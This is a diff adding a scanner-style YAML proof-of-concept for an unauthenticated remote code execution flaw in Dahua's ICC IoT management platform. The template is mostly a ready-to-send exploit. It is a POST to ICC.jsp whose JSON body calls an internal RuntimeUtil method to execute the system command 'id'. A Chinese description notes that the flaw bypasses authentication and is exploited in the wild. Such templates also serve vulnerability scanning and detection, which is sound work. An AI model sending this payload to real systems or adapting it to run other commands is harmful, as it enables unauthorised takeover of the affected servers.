@@ -1,0 +1,24 @@
+name: poc-yaml-dahua-icc-getclassvalue-rce
+set:
+  rand: randomLowercase(6)
+rules:
+  - method: POST
+    path: /evo-apigw/admin/API/Developer/ICC.jsp
+    headers:
+      Content-Type: application/json
+    body: |
+      {"data":{"clazzName":"com.dahua.admin.util.RuntimeUtil","methodName":"syncexecReturnInputStream","fieldName":["id"]}}
+    follow_redirects: false
+    expression: >
+      response.status == 200 && response.body.bcontains(b"RuntimeUtil")
+detail:
+  author: L4xy
+  description: |
+    大华智能物联综合管理平台（ICC）GetClassValue接口存在未授权远程代码执行漏洞。
+    攻击者通过向ICC.jsp发送精心构造的JSON数据包，触发Java反序列化漏洞，
+    可绕过平台安全认证执行任意系统命令。POC已公开且在野利用。
+    影响产品：大华ICC智能物联综合管理平台
+  links:
+    - https://savior-only.github.io/p/612e268d373741ca846c63d32e755cd3/
+    - https://github.com/chhc007/dahua-ICC-GetClassValue-scanner
+  tags: rce,dahua,icc,getclassvalue,deserialization
